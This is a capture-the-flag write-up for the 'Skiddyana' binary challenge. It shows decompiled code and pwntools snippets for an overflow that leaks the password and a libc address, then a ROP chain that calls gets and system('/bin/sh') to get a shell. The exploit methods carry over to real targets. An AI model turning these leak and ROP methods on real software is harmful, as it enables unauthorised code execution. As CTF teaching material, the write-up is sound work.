# Skiddyana Pwnz and the Loom of Fate 

Hello, here is an unintended solution for the Skiddyana challenge which was supposed to be a tipical ret2win, but i didn't see that function so i did a complete exploit

<div align="center">
	<img src="https://github.com/Wanasgheo/Writeups/assets/111740362/45db0a5c-2670-400d-b6d5-0d834f32553b"></img>
</div>

We can see that we are not allowed to run shellcode, but there is no PIE which we will see later that's pretty good.
After this we can take a look at the code with ghidra

```c

void main(void) {
  int iVar1;
  size_t len;
  undefined8 uStack592;
  char buffer_32 [32];
  undefined big_buffer [516];
  char buffer_8 [8];
  int choice;
  char *password;
  char *char_buffer;
  
  password = "thisisnotthepassword";
  char_buffer = "Drink your ovaltine";
  uStack592 = 0x4016ed;
  printf("\x1b[0;33m");
  uStack592 = 0x401701;
  printf(
        "  ____  _    _     _     _                           ____                     \n / ___|| |  _(_) __| | __| |_   _  __ _ _ __   __ _  |  _ \\__      ___ __  ____\n \\___ \\| |/ / |/ _`  |/ _` | | | |/ _` | \'_ \\ / _` | | |_) \\ \\ /\\ / / \'_ \\|_  /\n  ___) |   <| | (_| | (_|  | |_| | (_| | | | | (_| | |  __/ \\ V  V /| | | |/ / \n |____/|_|\\_\\_|\\__,_|\\__,_|\\__,  |\\__,_|_| |_|\\__,_| |_|     \\_/\\_/ |_| |_/___|\n                           |___/                                               \n                                 _   _   _                                     \n                  __ _ _ __   __| | | |_| |__   ___                            \n                 / _` | \'_ \\ / _` | | __| \'_ \\ / _ \\                           \n                | (_| | | | | (_| | | |_| | | |  __/                          \n                  \\__,_|_| |_|\\__,_|  \\__|_| |_|\\___|                          \n                                                                               \n     _                                    __   _____     _                     \n    | |    ___   ___  _ __ ___      ___  / _| |  ___|_ _| |_ ___               \n    | |   / _ \\ / _ \\| \'_ ` _ \\   / _ \\|  |_  | |_ / _` | __/ _ \\              \n    | |__| (_) | (_) | | | | | | | (_) |  _| |  _| ( _| | ||  __/              \n    |_____\\___/ \\___/|_| |_| |_|  \\___/|_|   |_|  \\__,_|\\__ \\___|              \n     "
        );
  uStack592 = 0x401715;
  printf("\x1b[0m");
  uStack592 = 0x40171f;
  putchar(10);
  while( true ) {
    while( true ) {
      while( true ) {
        while( true ) {
          uStack592 = 0x401733;
          printf("\n\n============================================================================="
                );
          uStack592 = 0x401747;
          printf(
                "\nChoose your next move:\n\n1) Enter the room of the loom\n2) Read the wall of prop hecy\n3) Enter the room of the fates\n4) leave\n\n> "
                );
          uStack592 = 0x40175f;
          fgets(buffer_8,8,stdin);
          uStack592 = 0x40176b;
          choice = atoi(buffer_8);
          if (choice != 1) break;
          uStack592 = 0x40178a;
          char_buffer = (char *)loomRoom(char_buffer,big_buffer);
        }
        if (choice != 2) break;
        uStack592 = 0x4017a5;
        puts(
            "\n\nYou look to the grand wall in front of you.\nA prophecy is etched into the stone an d looks ancient : \n"
            );
        uStack592 = 0x4017c0;
        printf("%s",char_buffer);	<---- Print a pointer
        uStack592 = 0x4017ca;
        putchar(10);
      }
      if (choice != 3) break;
      uStack592 = 0x4017e8;
      puts(
          "\n\nBefore you is a large stone door. As you behold it, you hear a voice inside of your h ead."
          );
      uStack592 = 0x4017fc;
      printf("\n\nSpeak the unpronouncable phrase to pass to the room of fates : \n\n> ");
      uStack592 = 0x401817;
      fgets(buffer_32,0x1a,stdin);
      uStack592 = 0x401826;
      len = strlen(buffer_32);
      buffer_32[len - 1] = '\0';
      uStack592 = 0x401848;
      iVar1 = strcmp(buffer_32,password);
      if (iVar1 == 0) {
        uStack592 = 0x401858;
        fatesRoom(char_buffer);
      }
      else {
        uStack592 = 0x40186c;
        puts("\nThe door does not open, the voice is silent.");
      }
    }
    if (choice == 4) break;
    uStack592 = 0x401890;
    puts("\nYou get confused and try to walk in a direction that doesn\'t exist. It doesn\'t work.")
    ;
  }
                    /* WARNING: Subroutine does not return */
  uStack592 = 0x401881;
  exit(0);
}


```

That's the main where we have some calls to functions, a print of a pointer that will be used as leaker, and a function that is called only if we get the correct password

```c

char * loomRoom(char *param_1,char *param_2) {

  /*Some useless vars*/
  ...
  char local_1c [8];
  int local_14;
  char *local_10;
  ...
  puts("\n\n=============================================================================\n");
  printf(
        "You enter the room of the loom, and see the loom of fate before you. You can etch a prophec y into the futre, or leave the future alone.\n1) Prophesize\n2) Leave\n\n> "
        );
  fgets(local_1c,8,stdin);
  local_14 = atoi(local_1c);
  if (local_14 == 1) {
    fgets((char *)&local_128,0x11e,stdin); // Here we have an overflow that let us to write over the printed pointer
    sVar1 = strlen((char *)&local_128);
    if (sVar1 < 0x101) {
      local_10 = param_2;
      strcpy(param_2,(char *)&local_128);
    }
    else {
      puts("\nWhoa whoa, slow down, that\'s too much prophecy. Life needs some mystery.");
    }
  }
  return local_10;
}


```

Here is the function that let us to leak the password and even the libc used in order to access the fatesRoom, that's all we can do because we are not able to write over the ret-address because it's to far

```c

void fatesRoom(char *param_1) {
  undefined8 local_98;
  undefined8 local_90;
  undefined8 local_88;
  undefined8 local_80;
  undefined8 local_78;
  undefined8 local_70;
  undefined8 local_68;
  undefined8 local_60;
  undefined8 local_58;
  undefined8 local_50;
  undefined8 local_48;
  undefined8 local_40;
  undefined8 local_38;
  undefined8 local_30;
  undefined8 local_28;
  undefined8 local_20;
  char local_14 [8];
  int local_c;
  
  local_98 = 0;
  local_90 = 0;
  local_88 = 0;
  local_80 = 0;
  local_78 = 0;
  local_70 = 0;
  local_68 = 0;
  local_60 = 0;
  local_58 = 0;
  local_50 = 0;
  local_48 = 0;
  local_40 = 0;
  local_38 = 0;
  local_30 = 0;
  local_28 = 0;
  local_20 = 0;
  puts("\n\n=============================================================================\n");
  printf("You enter the room of fates and see the tapestry of reality laid out before you.");
  puts("\nThe voice in your head returns:");
  puts(
      "\n\'Are you willing to force your prophecy onto the past? To corrupt this reality to find wha t you seek?\'"
      );
  printf("\n1) Yes\n2) No\n\n> ");
  fflush(stdin);
  fgets(local_14,8,stdin);
  local_c = atoi(local_14);
  if (local_c == 1) {
    strcpy((char *)&local_98,param_1);
  }
  else {
    puts("\nYou leave the room of the fates, this reality intact.");
  }
  return;
}


```

Lastly here there is the function that let us to get the real overflolw in order to change the code execution.
That's the code given except the win function or **theVoid** which i forgot...

By the way let's start by leaking the password and the libc with the overflow

![immagine](https://github.com/Wanasgheo/Writeups/assets/111740362/be23399b-cdc7-4899-9bfd-309d4230143b)

As you can see from the image above we just need to write a pad of **0x110** bytes and then write the address that we want to leak, as i did in the code below

```python
    def Leak(to_leak):
	    payload = flat(
	        b"a" * 0x118,
	        to_leak,
	    )
	
	    roomOfLoom(payload)
	    print_()
	
	    p.recvuntil(b"ancient : \n")
	    p.recvline()
	
	    leak = p.recvline()
	    try:
	        leak = u64(leak.strip().ljust(8, b"\x00"))
	        return leak
	    except:
	        return leak.strip().decode()
```

That's the function which i adapted in order to make it suitable for a password leak and even for an address one

I made two different calls of it, one with puts from the got and the other with the static address of the stored password or `0x40232a`, because there is no PIE
<div align="center">
	<img src="https://github.com/Wanasgheo/Writeups/assets/111740362/aebbe86b-6cd6-49b6-bee1-c4a7e67eee86"></img>
</div>
With the libc leak of puts we are even able to retrieve the libc version and with that the base, thanks to [`libc.blukat`](https://libc.blukat.me/)

![immagine](https://github.com/Wanasgheo/Writeups/assets/111740362/50353574-6286-419f-92fa-98767b15de6b)

Now we are able to access the fatesRoom where we can get an overflow of a single address to land where we need. 

The first thought was to jump over one_gadget but none of the given were affordable, because of the too restricted rules, so tried with a different approach

<div align="center">
	<img src="https://github.com/Wanasgheo/Writeups/assets/111740362/0285f512-1197-47ce-b01d-4c0df8f3d555"></img>
</div>

As you can see all the registers were pointing to the buffer, so we can think that the call to system with the string `/bin/sh` in the buffer is the way, but it is not because of the `strcpy` which avoid to print over the NULL terminated string.

After some struggle i came with the solution of calling the `gets` function from the libc because we already have the `RDI` set to the buffer, like this we are able to write as many bytes we want

<div align="center">
	<img src="https://github.com/Wanasgheo/Writeups/assets/111740362/d149b229-c0d7-4b09-8252-c964de9d7cd7"></img>
</div>

And it worked! We just have small problem or that we start write past the the first byte, like this we are not able to us the first address as we want, but we just need to find a gadget that return with the same base, which is kinda simple, because we have the libc

```diff
	0x000000000009d114 : or dword ptr [rdi + 0x30c], 0x40 ; jmp 0x9d0d8
	0x00000000000ce114 : push rdi ; jmp 0xce0b2
+	0x000000000003b114 : sbb eax, 0x3d8b4c00 ; ret
	0x00000000000c6114 : shr byte ptr [rdx], 0x4c ; lea ecx, [rsp + 0x18] ; call r13
	0x0000000000155114 : stc ; call rbp
```
That's perfect because it does a simple operation and then return, so now we can build the real our rop

```python
	address_14_offset = 0x3b114 + libc.address
	ret = rop.find_gadget(['ret'])[0]
	pop_rdi = rop_libc.find_gadget(['pop rdi', 'ret'])[0]
	bin_sh = next(libc.search(b"/bin/sh\x00"))
	system = libc.symbols['system']

	call_system = flat(
	        address_14_offset,
	        ret,
	        pop_rdi,
	        bin_sh,
	        system,
   	 )
```

And when we run it

![immagine](https://github.com/Wanasgheo/Writeups/assets/111740362/109754d1-cca6-4f97-a326-173bec6709ea)

Like this we are able to get a shell, of course with the intended way, this was way faster, because we just had to insert the function `theVoid` over the `gets` call, but like this it was even more interesting ;)

Ty for the attention hope to see you again 0xCY@
